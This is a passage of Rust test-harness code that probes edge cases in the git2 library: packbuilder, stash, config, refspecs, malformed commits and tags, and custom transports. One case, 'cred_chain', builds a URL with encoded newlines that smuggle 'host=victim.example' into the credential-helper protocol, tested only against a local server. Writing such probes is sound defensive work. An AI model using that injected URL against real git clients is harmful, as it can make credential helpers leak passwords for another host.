"indexer_ctrl" => { let (td,repo)=init(); let dir=TempDir::new().unwrap(); let mut pb=repo.packbuilder().unwrap(); let h=repo.head().unwrap().target().unwrap(); pb.insert_commit(h).unwrap(); let mut buf=Buf::new(); pb.write_buf(&mut buf).unwrap(); let odb=Odb::new().unwrap(); let mut ix=Indexer::new(Some(&odb),dir.path(),0,true).unwrap(); use std::io::Write; println!("{:?}", ix.write(&buf).map_err(|e|e.to_string())); println!("{:?}", ix.commit().map_err(|e|e.to_string())); }
"apply_ctrl" => { let (td,repo)=init(); let id=commit_file(&td,&repo,"a.txt","two\n","2"); let c=repo.find_commit(id).unwrap(); let d=repo.diff_tree_to_tree(Some(&c.parent(0).unwrap().tree().unwrap()),Some(&c.tree().unwrap()),None).unwrap(); let mut o=ApplyOptions::new(); o.delta_callback(|_|{println!("delta cb");true}); let t=c.parent(0).unwrap().tree().unwrap(); println!("{:?}", repo.apply_to_tree(&t,&d,Some(&mut o)).map(|_|())); }
"stash_ctrl" => { let (td,mut repo)=init(); fs::write(td.path().join("a.txt"),"dirty\n").unwrap(); let s=repo.signature().unwrap(); repo.stash_save(&s,"m",None).unwrap(); let mut o=StashApplyOptions::new(); o.progress_cb(|p|{println!("progress {:?}",p);true}); println!("{:?}", repo.stash_apply(0,Some(&mut o))); }
"pb_hash2" => { let (td,repo)=init(); let mut pb=repo.packbuilder().unwrap(); let h=repo.head().unwrap().target().unwrap(); pb.insert_commit(h).unwrap(); let d=TempDir::new().unwrap(); pb.write(d.path(),0).unwrap(); println!("after write: count {} hash {:?} name {:?}",pb.object_count(),pb.hash(),pb.name()); }
"pb_leak" => { let (td,repo)=init(); let d=TempDir::new().unwrap(); for _ in 0..50 { let mut pb=repo.packbuilder().unwrap(); pb.write(d.path(),0).unwrap(); } println!("done"); }
"sub_lookup" => { let (td,repo)=init(); let h=repo.head().unwrap().target().unwrap(); let mut idx=repo.index().unwrap(); let e=IndexEntry{ctime:IndexTime::new(0,0),mtime:IndexTime::new(0,0),dev:0,ino:0,mode:0o160000,uid:0,gid:0,file_size:0,id:h,flags:0,flags_extended:0,path:b"gl".to_vec()}; idx.add(&e).unwrap(); idx.write().unwrap(); println!("{:?}",repo.submodules().map(|v|v.len()).map_err(|e|e.to_string())); }

"cfg_empty" => { let d=TempDir::new().unwrap(); let p=d.path().join("c"); fs::write(&p,"[a]\n\tb =\n").unwrap(); let c=Config::open(&p).unwrap(); println!("{:?}",c.get_string("a.b")); }
"cfg_empty_path" => { let d=TempDir::new().unwrap(); let p=d.path().join("c"); fs::write(&p,"[a]\n\tb =\n").unwrap(); let c=Config::open(&p).unwrap(); println!("{:?}",c.get_path("a.b")); }
"cred_helper_empty" => { let d=TempDir::new().unwrap(); let p=d.path().join("c"); fs::write(&p,"[credential]\n\thelper =\n").unwrap(); let c=Config::open(&p).unwrap(); let mut h=CredentialHelper::new("https://x/y"); h.config(&c); println!("{:?}",h.execute()); }
"stats_empty" => { let (td,repo)=init(); let id=commit_file(&td,&repo,"a.txt","two\n","2"); let c=repo.find_commit(id).unwrap(); let d=repo.diff_tree_to_tree(Some(&c.parent(0).unwrap().tree().unwrap()),Some(&c.tree().unwrap()),None).unwrap(); let s=d.stats().unwrap(); let b=s.to_buf(DiffStatsFormat::NONE,80).unwrap(); println!("{:?}",b.as_str()); }
"patch_empty" => { let mut p=Patch::from_buffers(b"same\n",None,b"same\n",None,None).unwrap(); let b=p.to_buf().unwrap(); println!("{:?}",b.as_str()); }
"header_empty" => { let (td,repo)=init(); let tree=repo.head().unwrap().peel_to_tree().unwrap(); let raw=format!("tree {}\nauthor a <b> 1 +0000\ncommitter a <b> 1 +0000\nxh \n\nm\n",tree.id()); let oid=repo.odb().unwrap().write(ObjectType::Commit,raw.as_bytes()).unwrap(); let c=repo.find_commit(oid).unwrap(); let b=c.header_field_bytes("xh").unwrap(); println!("{:?}",b.as_str()); }
"search_path_empty" => { let (td,repo)=init(); unsafe{ opts::set_search_path(ConfigLevel::ProgramData,"").unwrap(); println!("{:?}",opts::get_search_path(ConfigLevel::ProgramData)); } }
"msg_empty" => { let (td,repo)=init(); fs::write(repo.path().join("MERGE_MSG"),b"").unwrap(); println!("{:?}",repo.message()); }
"default_branch_detached" => { let (td,repo)=init(); println!("{:?}",repo.note_default_ref()); }
"sub_cfg" => { let (td,repo)=init(); let mut c=repo.config().unwrap(); c.set_str("submodule.only-in-config.url","/x").unwrap(); c.set_str("submodule.only-in-config.active","true").unwrap(); println!("{:?}",repo.submodules().map(|v|v.len()).map_err(|e|e.to_string())); }

"is_flags" => { println!("MergeAnalysis::ANALYSIS_NONE.is_none()={} PathspecFlags::DEFAULT.is_default()={} Sort::NONE.is_none()={} StashFlags::DEFAULT.is_default()={} IndexAddOption::DEFAULT.is_default()={} RepositoryInitMode::SHARED_UMASK.is_shared_umask()={} MergePreference::NONE.is_none()={} DiffStatsFormat::NONE.is_none()={} StashApplyFlags::DEFAULT.is_default()={}",
   MergeAnalysis::ANALYSIS_NONE.is_none(),PathspecFlags::DEFAULT.is_default(),Sort::NONE.is_none(),StashFlags::DEFAULT.is_default(),IndexAddOption::DEFAULT.is_default(),RepositoryInitMode::SHARED_UMASK.is_shared_umask(),MergePreference::NONE.is_none(),DiffStatsFormat::NONE.is_none(),StashApplyFlags::DEFAULT.is_default()); }
"parents_fused" => { let (td,repo)=init(); let h=repo.head().unwrap().target().unwrap(); let tree=repo.head().unwrap().peel_to_tree().unwrap(); let raw=format!("tree {}\nparent 1111111111111111111111111111111111111111\nparent {}\nauthor a <b> 1 +0000\ncommitter a <b> 1 +0000\n\nm\n",tree.id(),h); let oid=repo.odb().unwrap().write(ObjectType::Commit,raw.as_bytes()).unwrap(); let c=repo.find_commit(oid).unwrap(); let mut p=c.parents(); println!("len()={}",p.len()); println!("1st {:?}",p.next().map(|c|c.id())); println!("2nd {:?}",p.next().map(|c|c.id())); println!("collect len={}",c.parents().collect::<Vec<_>>().len()); }
"cred_chain" => { use std::io::{Read,Write}; let l=std::net::TcpListener::bind("127.0.0.1:0").unwrap(); let port=l.local_addr().unwrap().port(); std::thread::spawn(move||{ for s in l.incoming(){ let mut s=s.unwrap(); let mut b=[0u8;4096]; let _=s.read(&mut b); let _=s.write_all(b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic realm=\"x\"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"); } });
    let (td,repo)=init(); let url=format!("http://x%0Ahost=victim.example%0Aprotocol=https@127.0.0.1:{}/r.git",port); let mut rm=repo.remote_anonymous(&url).unwrap(); let mut cb=RemoteCallbacks::new(); cb.credentials(|u,name,_|{ println!("credentials cb: url={:?} username_from_url={:?}",u,name); Err(Error::from_str("stop")) }); let mut fo=FetchOptions::new(); fo.remote_callbacks(cb); println!("{:?}", rm.fetch(&[] as &[&str],Some(&mut fo),None).map_err(|e|e.to_string())); }
"transport_io_nul" => { use git2::transport::*; use std::io; struct S; struct St; impl io::Read for St{ fn read(&mut self,_:&mut [u8])->io::Result<usize>{ Err(io::Error::new(io::ErrorKind::Other,"a\0b")) } } impl io::Write for St{ fn write(&mut self,b:&[u8])->io::Result<usize>{Ok(b.len())} fn flush(&mut self)->io::Result<()>{Ok(())} }
    impl SmartSubtransport for S{ fn action(&self,_:&str,_:Service)->Result<Box<dyn SmartSubtransportStream>,Error>{Ok(Box::new(St))} fn close(&self)->Result<(),Error>{Ok(())} }
    unsafe{ register("dummy",|r|Transport::smart(r,true,S)).unwrap(); } let (td,repo)=init(); let mut rm=repo.remote("o","dummy://x").unwrap(); println!("{:?}",rm.fetch(&["main"],None,None).map_err(|e|e.to_string())); }
"transport_factory_err" => { use git2::transport::*; unsafe{ register("dummy",|_r|Err(Error::from_str("my factory reason"))).unwrap(); } let (td,repo)=init(); let mut rm=repo.remote("o","dummy://x").unwrap(); println!("{:?}",rm.fetch(&["main"],None,None).map_err(|e|e.to_string())); }
"notify_ok_check" => { let (td,repo)=init(); println!("n/a"); }

"refspec_dst" => { let (td,repo)=init(); let r=repo.remote_with_fetch("o","/n","refs/heads/main").unwrap(); let s=r.get_refspec(0).unwrap(); println!("str {:?}",s.str()); println!("src {:?}",s.src()); println!("dst {:?}",s.dst()); }
"refspec_src" => { let (td,repo)=init(); repo.remote("o","/n").unwrap(); repo.remote_add_push("o",":refs/heads/x").unwrap(); let r=repo.find_remote("o").unwrap(); for s in r.refspecs(){ println!("str {:?}",s.str()); println!("src {:?}",s.src()); println!("dst {:?}",s.dst()); } }
"refspec_lhs_only" => { let (td,repo)=init(); let r=repo.remote_with_fetch("o","/n",":").unwrap(); for s in r.refspecs(){ println!("str {:?}",s.str()); println!("src {:?}",s.src()); println!("dst {:?}",s.dst()); println!("transform {:?}",s.transform("refs/heads/x").map(|b|b.as_str().map(|x|x.to_string())).map_err(|e|e.to_string())); } }
"commit_bare" => { let (td,repo)=init(); let tree=repo.head().unwrap().peel_to_tree().unwrap(); let raw=format!("tree {}\nauthor a <b> 1 +0000\ncommitter a <b> 1 +0000\n",tree.id()); let oid=repo.odb().unwrap().write(ObjectType::Commit,raw.as_bytes()).unwrap(); let c=repo.find_commit(oid).unwrap(); println!("{:?} {:?} {:?} {:?} {:?}",c.message(),c.message_raw(),c.summary(),c.body(),c.raw_header()); println!("{:?}",c); }
"tag_bare" => { let (td,repo)=init(); let h=repo.head().unwrap().target().unwrap(); let raw=format!("object {}\ntype commit\ntag t\n",h); let oid=repo.odb().unwrap().write(ObjectType::Tag,raw.as_bytes()).unwrap(); let t=repo.find_tag(oid).unwrap(); println!("{:?} {:?} {:?}",t.name(),t.message(),t.tagger().map(|s|s.name().map(|x|x.to_string()))); }
_ => panic!("unknown"),
    }
}
